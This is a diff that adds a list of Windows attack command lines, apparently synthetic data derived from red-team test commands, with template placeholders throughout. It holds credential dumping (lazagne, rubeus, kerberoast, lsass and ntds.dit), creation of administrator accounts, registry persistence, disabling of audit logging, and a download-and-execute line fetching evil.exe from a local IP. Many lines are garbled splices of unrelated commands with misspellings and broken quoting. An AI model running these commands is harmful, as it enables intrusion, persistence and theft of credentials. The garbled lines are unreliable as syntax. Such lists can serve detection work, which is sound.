@@ -1,0 +1,64 @@
+wt.exe '' $ { command }
+ipconfig
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' /f '' $ { logon
+net user $ { username } /add > $ { target_ip } -a `` $ { binary_path }
+pktmon.exe start -- etw
+$ create = `` $ shell.createshortcut { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 ''
+dumpminitool.exe -- unprivileged /y
+get-ciminstance -classname win32_operatingsystem | select-object -property buildnumber , buildtype , disabled '' ' $ { \microsoft\teams\current\teams.exe
+namp -sn $ { ip address }
+net `` hklm\system\currentcontrolset\control\session `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' /t reg_sz /d 1 /f
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t reg_dword /d `` dllname '' 0 /d 1 , ' 0 , disable /failure : disable
+cmdkey.exe /list
+settingsynchost -loadandrundiagscriptnocab $ { string }
+`` $ env : software\classes\clsid\ { output_zip_name } '' $ { binary } /add
+psexec targetinstance asynchronous user /server : target_extension_handler
+net user $ { domain }
+net user $ { target_ip }
+host /tn { user_name }
+new-localuser -name `` $ { service_name } password= $ { path } /fullmemdmp /fullmemdmp player
+net user /domain
+reg add `` hklm\software\microsoft\command processor '' /v `` loadappinit_dlls '' -name `` $ { encoded command } ''
+sdbinst redirect.sdb
+rubeus.exe dump
+whoami
+upx - $ { bits_job_name }
+reg add hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 /v `` lsadbextpt '' /t reg_sz /d `` bypass '' -force /d `` $ { command } ''
+nmap -- unprivileged -a $ { path }
+net stop spooler
+open $ { interface }
+net user administrator /add /domain
+get-ciminstance http : //192.168.1.29:9000/payload/evil.exe -o ) /domain
+net stop spooler
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' -name $ { parent_pid } , ' ' $ { binary__file_path } '' `` $ { binary__file_path } '' , $ { -count $ { command } '' -enabled % \ $ { target_ip }
+ffuf -w $ { password } '' /add
+rdrleakdiag.exe /p $ { target domain .\redirect.sdb
+net localgroup
+lazagne.exe windows
+cscript $ { compression_level } -o { -asplaintext 1 /domain
+net user /domain
+sc query
+$ target = `` hklm\system\currentcontrolset\control\print\environments\windows account hklm\system\currentcontrolset\control\session cor_enable_profiling '' root\subscription '' ''
+reg `` hklm\software\microsoft\windows manager\environment '' '' /v `` file '' /v command }
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' /v altitude /d `` 1 ''
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' /v `` i = `` $ i \appdata\local\temp\lsass.dmp full
+net user /domain
+net group `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_sz /d `` reg_sz /f /d `` art test '' /t lsass_lib.dll_path }
+openconsole.exe $ { command }
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\mshta.exe '' /v autorun '' /d `` $ { binary_path } '' /f
+iex ( iwr /set -s % new-object net.webclient ) .downloadstring ( ' ; invoke-rubeus -command `` kerberoast /format : '' psexec.exe c : \users\ $ { command }
+namp -sn $ { user_name } /add
+gobuster dir -u $ { command } ''
+auditpol /set /category : '' account logon '' /success : disable /failure : disable
+bitsadmin.exe /resume $ $ { input_folder_name }
+gobuster dns -d $ { ip } -t $ { command }
+set-executionpolicy -scope process bypass
+set windir= $ { local_file_path }
+wmix ueraccount get /all /format : $ { end_address } } \windows\ntds\ntds.dit set , ' '' $ ( $ i $ { password } -p $ { path } -l $ profile
+copy /y $ { dll_path }
+gobuster zero_padding.py $ { ip } ''
+copy `` 7 options\svchost.exe '' /launch `` clsid }
+net stop w32time
+gobuster vhost -u $ { wordlist }
+lazagne.exe browsers
+reg query hklm\software\microsoft
